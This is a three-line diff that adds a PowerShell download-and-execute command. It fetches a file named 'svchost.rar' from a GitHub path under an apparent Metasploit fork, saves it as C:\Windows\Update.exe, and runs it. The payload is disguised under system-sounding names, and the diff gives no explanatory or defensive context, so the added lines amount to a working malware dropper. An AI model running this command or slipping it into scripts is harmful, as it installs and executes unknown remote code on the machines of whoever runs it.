@@ -1,0 +1,3 @@
+
+(new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/youaresmart/metasploit-framework/master/external/svchost.rar','C:\Windows\Update.exe');
+C:\Windows\Update.exe
